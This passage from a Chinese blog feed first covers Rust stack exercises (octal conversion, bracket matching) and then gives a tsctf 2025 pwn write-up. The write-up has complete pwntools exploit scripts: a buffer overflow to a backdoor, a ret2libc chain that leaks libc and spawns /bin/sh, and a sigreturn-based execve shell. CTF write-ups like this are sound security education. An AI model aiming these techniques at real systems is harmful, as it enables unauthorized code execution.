<h4 id="测试数据"><a href="#测试数据" class="headerlink" title="测试数据"></a>测试数据</h4><p>依据软件工程的测试技术自己确定，注意测试边界数据。</p>
<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>在实现了基本操作后，顺理成章：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">trans</span><span class="token punctuation">(</span>dec <span class="token punctuation">:</span> <span class="token keyword">i32</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> s <span class="token operator">=</span> <span class="token class-name">Stack</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> value <span class="token operator">=</span> dec<span class="token punctuation">;</span>

    <span class="token keyword">if</span> value <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>
        s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">while</span> value <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> m <span class="token operator">=</span> value <span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">;</span>
        s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">;</span>
        value <span class="token operator">=</span> value <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">while</span> <span class="token operator">!</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>top <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token macro property">print!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>测试：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[test]</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">test_trans</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
        <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">trans</span><span class="token punctuation">(</span><span class="token number">1348</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>看到结果：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">running <span class="token number">1</span> <span class="token builtin class-name">test</span>
<span class="token number">2504</span>
<span class="token builtin class-name">test</span> stack::tests::test_trans <span class="token punctuation">..</span>. ok

<span class="token builtin class-name">test</span> result: ok. <span class="token number">1</span> passed<span class="token punctuation">;</span> <span class="token number">0</span> failed<span class="token punctuation">;</span> <span class="token number">0</span> ignored<span class="token punctuation">;</span> <span class="token number">0</span> measured<span class="token punctuation">;</span> <span class="token number">0</span> filtered out<span class="token punctuation">;</span> finished <span class="token keyword">in</span> <span class="token number">0</span>.00s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>完成</p>
<h2 id="括号匹配的检验"><a href="#括号匹配的检验" class="headerlink" title="括号匹配的检验"></a>括号匹配的检验</h2><h3 id="问题描述-1"><a href="#问题描述-1" class="headerlink" title="问题描述"></a>问题描述</h3><p>假设表达式中允许有两种括号：圆括号和方括号，其嵌套的顺序随意，即（（）[ ]）或[（[ ] [ ]）]等为正确格式，[（]）或（（（]均为不正确的格式。检验括号是否匹配的方法可用”期待的紧迫程度”这个概念来描述。</p>
<p>例如：考虑下列的括号序列：<br><pre class="line-numbers language-none"><code class="language-none">[  (  [  ]  [  ]  )  ]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<p>当计算机接收了第1个括号以后，它期待着与其匹配的第8个括号的出现，然而等来的却是第2个括号，此时第1个括号”[“只能暂时靠边，而迫切等待与第2个括号相匹配的第7个括号”）”的出现，类似的，因只等来了第3个括号”[“，此时，其期待的紧迫程度较第2个括号更紧迫，则第2个括号只能靠边，让位于第3个括号，显然第3个括号的期待紧迫程度高于第2个括号，而第2个括号的期待紧迫程度高于第1个括号；在接收了第4个括号之后，第3个括号的期待得到了满足，消解之后，第2个括号的期待匹配就成了最急迫的任务了，……，依次类推。可见这个处理过程正好和栈的特点相吻合。</p>
<h3 id="基本要求-1"><a href="#基本要求-1" class="headerlink" title="基本要求"></a>基本要求</h3><p>读入圆括号和方括号的任意序列，输出”匹配”或”此串括号匹配不合法”。</p>
<h3 id="测试数据-1"><a href="#测试数据-1" class="headerlink" title="测试数据"></a>测试数据</h3><ul>
<li>输入 <code>([ ]())</code>，结果”匹配”</li>
<li>输入 <code>[( ))</code>，结果”此串括号匹配不合法”</li>
</ul>
<h3 id="实现提示"><a href="#实现提示" class="headerlink" title="实现提示"></a>实现提示</h3><p>设置一个栈，每读入一个括号：</p>
<ul>
<li>若是左括号，则作为一个新的更急迫的期待压入栈中</li>
<li>若是右括号，并且与当前栈顶的左括号相匹配，则将当前栈顶的左括号退出</li>
<li>继续读下一个括号</li>
<li>如果读入的右括号与当前栈顶的左括号不匹配，则属于不合法的情况</li>
</ul>
<p>在初始和结束时，栈应该是空的。</p>
<h3 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h3><p>增加了一个辅助函数<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">is_empty</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">bool</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">self</span><span class="token punctuation">.</span>top <span class="token operator">==</span> <span class="token number">0</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">_match</span><span class="token punctuation">(</span>seq <span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> s <span class="token operator">=</span> <span class="token class-name">Stack</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> c <span class="token keyword">in</span> seq<span class="token punctuation">.</span><span class="token function">chars</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">match</span> c <span class="token punctuation">&#123;</span>
            <span class="token char">'('</span> <span class="token operator">|</span> <span class="token char">'['</span> <span class="token operator">=></span> s<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>c <span class="token keyword">as</span> <span class="token keyword">i32</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token punctuation">,</span>
            <span class="token char">')'</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> s<span class="token punctuation">.</span><span class="token function">is_empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span> <span class="token operator">!=</span> <span class="token char">'('</span> <span class="token keyword">as</span> <span class="token keyword">i32</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">return</span> <span class="token class-name">Err</span><span class="token punctuation">(</span><span class="token macro property">anyhow!</span><span class="token punctuation">(</span><span class="token string">"括号不匹配"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
            <span class="token char">']'</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> s<span class="token punctuation">.</span><span class="token function">is_empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> s<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span> <span class="token operator">!=</span> <span class="token char">'['</span> <span class="token keyword">as</span> <span class="token keyword">i32</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">return</span> <span class="token class-name">Err</span><span class="token punctuation">(</span><span class="token macro property">anyhow!</span><span class="token punctuation">(</span><span class="token string">"括号不匹配"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
            _ <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token class-name">Err</span><span class="token punctuation">(</span><span class="token macro property">anyhow!</span><span class="token punctuation">(</span><span class="token string">"出现非预期字符"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#125;</span> <span class="token comment">// 忽略其他字符</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> s<span class="token punctuation">.</span><span class="token function">is_empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token class-name">Ok</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token class-name">Err</span><span class="token punctuation">(</span><span class="token macro property">anyhow!</span><span class="token punctuation">(</span><span class="token string">"mismatch"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>测试：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[test]</span>
<span class="token keyword">fn</span> <span class="token function-definition function">test_match</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">_match</span><span class="token punctuation">(</span><span class="token string">"()"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">_match</span><span class="token punctuation">(</span><span class="token string">"[]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">_match</span><span class="token punctuation">(</span><span class="token string">"([])"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">_match</span><span class="token punctuation">(</span><span class="token string">"[()]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">_match</span><span class="token punctuation">(</span><span class="token string">"([][])"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">_match</span><span class="token punctuation">(</span><span class="token string">"(([]))"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 不匹配的情况</span>
    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">_match</span><span class="token punctuation">(</span><span class="token string">"("</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">_match</span><span class="token punctuation">(</span><span class="token string">")"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">_match</span><span class="token punctuation">(</span><span class="token string">"([)]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">_match</span><span class="token punctuation">(</span><span class="token string">"]["</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">_match</span><span class="token punctuation">(</span><span class="token string">"())"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token function">_match</span><span class="token punctuation">(</span><span class="token string">"[[]"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">is_err</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="停车场管理"><a href="#停车场管理" class="headerlink" title="停车场管理"></a>停车场管理</h2><p>逃了逃了</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;基本结构&quot;&gt;&lt;a href=&quot;#基本结构&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="从0开始的rust之旅" scheme="https://aucept.in/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84rust%E4%B9%8B%E6%97%85/"/>
    
    
    <category term="rust" scheme="https://aucept.in/tags/rust/"/>
    
    <category term="栈" scheme="https://aucept.in/tags/%E6%A0%88/"/>
    
  </entry>
  
  <entry>
    <title>tsctf 2025</title>
    <link href="https://aucept.in/2025/10/12/tsctf-2025/"/>
    <id>https://aucept.in/2025/10/12/tsctf-2025/</id>
    <published>2025-10-12T15:28:17.000Z</published>
    <updated>2025-10-12T17:02:42.302Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h2><p>签到题，明摆着的栈溢出和后门函数，略</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>

ret_addr <span class="token operator">=</span> <span class="token number">0x400501</span>
backdoor <span class="token operator">=</span> <span class="token number">0x0400676</span>
io <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token string">"host.docker.internal"</span><span class="token punctuation">,</span> <span class="token number">64958</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"sign-in!"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h2><p>提示了ret2libc<br><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  _BYTE v1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h] BYREF</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No backdoors this time!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">gets</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>只给了一个任意读，第一步是泄露libc基地址，利用got表泄露，gadget都很全，然后回到vuln函数再利用一次</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>

pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x400713</span>
ret_addr <span class="token operator">=</span> <span class="token number">0x4004c9</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>

<span class="token comment">#io = process('./pwn')</span>
io <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token string">"host.docker.internal"</span><span class="token punctuation">,</span><span class="token number">32821</span><span class="token punctuation">)</span>
<span class="token comment"># 第一阶段：泄露puts地址</span>
puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> 
vuln_addr <span class="token operator">=</span> <span class="token number">0x400626</span>

payload1 <span class="token operator">=</span> <span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">24</span>
payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>
payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>
payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>vuln_addr<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"time!"</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
<span class="token comment"># 接收泄露的地址</span>
puts_leak <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> puts_leak <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
binsh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"puts leak: 0x</span><span class="token interpolation"><span class="token punctuation">&#123;</span>puts_leak<span class="token punctuation">:</span><span class="token format-spec">x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"libc base: 0x</span><span class="token interpolation"><span class="token punctuation">&#123;</span>libc_base<span class="token punctuation">:</span><span class="token format-spec">x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"system: 0x</span><span class="token interpolation"><span class="token punctuation">&#123;</span>system_addr<span class="token punctuation">:</span><span class="token format-spec">x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"/bin/sh: 0x</span><span class="token interpolation"><span class="token punctuation">&#123;</span>binsh_addr<span class="token punctuation">:</span><span class="token format-spec">x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token comment"># 第二阶段：获取shell</span>
payload2 <span class="token operator">=</span> <span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">24</span>
payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>
payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>
payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
<span class="token comment">#gdb.attach(io)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Easy-syscall"><a href="#Easy-syscall" class="headerlink" title="Easy-syscall"></a>Easy-syscall</h2><p>有一个magic函数<br><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">magic</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>

  result <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">;</span>
  __asm <span class="token punctuation">&#123;</span> syscall<span class="token punctuation">;</span> LINUX <span class="token operator">-</span> sys_rt_sigreturn <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>进行了一个陌生的系统调用，其作用很强大，根据栈上数据重新设置所有寄存器的值，pwntools里有<code>SigreturnFrame()</code>函数来辅助构建payload</p>
<p>既然可以随意修改寄存器的值了，还有栈溢出可以ROP，那就把rax设置成59，再跳到call system即可<br><pre class="line-numbers language-none"><code class="language-none">from pwn import *
context(arch&#x3D;&#39;amd64&#39;, os&#x3D;&#39;linux&#39;, log_level&#x3D;&#39;debug&#39;)
context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]

#io &#x3D; process(&#39;.&#x2F;pwn&#39;)
io &#x3D; connect(&quot;host.docker.internal&quot;,36493)

io.recvuntil(b&quot;here...&quot;)
magic_addr &#x3D; 0x40117E
binsh &#x3D; 0x0402008
ret_addr &#x3D; 0x40101a
syscall_addr &#x3D; 0x401185
bss_addr &#x3D; 0x404060

frame &#x3D; SigreturnFrame() 
frame.rax &#x3D; 59
frame.rdi &#x3D; 0x402008
frame.rsi &#x3D; 0
frame.rdx &#x3D; 0
frame.rip &#x3D; 0x401185


frame_bytes &#x3D; bytes(frame)

payload &#x3D; b&quot;A&quot;*48 + b&quot;B&quot;*8
payload +&#x3D; p64(magic_addr)
payload +&#x3D; bytes(frame)


#gdb.attach(io)
io.send(payload)

io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>解这道题的时候一开始手欠在ROP链的开始放了一个ret的gadget，导致sigreturn的时候寄存器全都错位了且其中一个怎么都设置不对正确的值，一度以为pwntools不靠谱了</p>
<h2 id="sentences"><a href="#sentences" class="headerlink" title="sentences"></a>sentences</h2><p>一如既往地打开IDA</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-114h]</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">264</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-110h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+118h] [rbp-8h]</span>

